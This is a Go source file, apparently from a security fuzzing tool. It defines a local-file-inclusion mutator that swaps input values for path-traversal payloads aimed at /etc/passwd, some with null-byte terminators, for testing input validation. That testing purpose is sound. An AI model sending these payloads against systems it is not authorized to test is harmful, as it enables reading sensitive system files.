package mutation

import (
	"math/rand"
	"reflect"
)

var fileInclusionPayloads = []string{
	"../../../../../../../../../../../../../../../../../../../../../../etc/passwd",
	"../../../../../../../../../../../../../../../../../../../../../etc/passwd",
	"../../../../../../../../../../../../../../../../../../../../etc/passwd",
	"../../../../../../../../../../../../../../../../../../../etc/passwd",
	"../../../../../../../../../../../../../../../../../../etc/passwd",
	"../../../../../../../../../../../../../../../../../etc/passwd",
	"../../../../../../../../../../../../../../../../etc/passwd",
	"../../../../../../../../../../../../../../../etc/passwd",
	"../../../../../../../../../../../../../../etc/passwd",
	"../../../../../../../../../../../../../etc/passwd",
	"../../../../../../../../../../../../etc/passwd",
	"../../../../../../../../../../../etc/passwd",
	"../../../../../../../../../../etc/passwd",
	"../../../../../../../../../etc/passwd",
	"../../../../../../../../etc/passwd",
	"../../../../../../../etc/passwd",
	"../../../../../../etc/passwd",
	"../../../../../etc/passwd",
	"../../../../etc/passwd",
	"../../../etc/passwd",
	"../../etc/passwd",
	"../etc/passwd",
	"../../../../../../../../../../../../../../../../../../../../../../etc/passwd\x00",
	"../../../../../../../../../../../../../../../../../../../../../etc/passwd\x00",
	"../../../../../../../../../../../../../../../../../../../../etc/passwd\x00",
	"../../../../../../../../../../../../../../../../../../../etc/passwd\x00",
	"../../../../../../../../../../../../../../../../../../etc/passwd\x00",
	"../../../../../../../../../../../../../../../../../etc/passwd\x00",
	"../../../../../../../../../../../../../../../../etc/passwd\x00",
	"../../../../../../../../../../../../../../../etc/passwd\x00",
	"../../../../../../../../../../../../../../etc/passwd\x00",
	"../../../../../../../../../../../../../etc/passwd\x00",
	"../../../../../../../../../../../../etc/passwd\x00",
	"../../../../../../../../../../../etc/passwd\x00",
	"../../../../../../../../../../etc/passwd\x00",
	"../../../../../../../../../etc/passwd\x00",
	"../../../../../../../../etc/passwd\x00",
	"../../../../../../../etc/passwd\x00",
	"../../../../../../etc/passwd\x00",
	"../../../../../etc/passwd\x00",
	"../../../../etc/passwd\x00",
	"../../../etc/passwd\x00",
	"../../etc/passwd\x00",
	"../etc/passwd\x00",
}

// LocalFileInclusion replaces a value with a random file inclusion payload.
// For more information on local file inclusion: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
// Example: Hello -> ../../../../../../etc/passwd
type LocalFileInclusion struct{}

// ID returns mutator's 3-digit ID.
func (m *LocalFileInclusion) ID() string {
	return "017"
}

// Name returns the mutator's name.
func (m *LocalFileInclusion) Name() string {
	return "Local File Inclusion"
}

// Description returns the mutator's description.
func (m *LocalFileInclusion) Description() string {
	return "Replace value with random file inclusion payload"
}

// CompatibleKinds returns the data types that the mutator can mutate.
func (m *LocalFileInclusion) CompatibleKinds() []reflect.Kind {
	return []reflect.Kind{reflect.String, reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32, reflect.Int64, reflect.Uint, reflect.Uint8, reflect.Uint16, reflect.Uint32, reflect.Uint64, reflect.Float32, reflect.Float64, reflect.Invalid}
}

// Mutate returns a random local file inclusion payload.
// All payloads attempt to include /etc/passwd in order to have predictable output in case
// the local file inclusin attack is successful.
// Example: ../../../../../../etc/passwd
func (m *LocalFileInclusion) Mutate(subject reflect.Value, r *rand.Rand) interface{} {
	return fileInclusionPayloads[r.Intn(len(fileInclusionPayloads))]
}
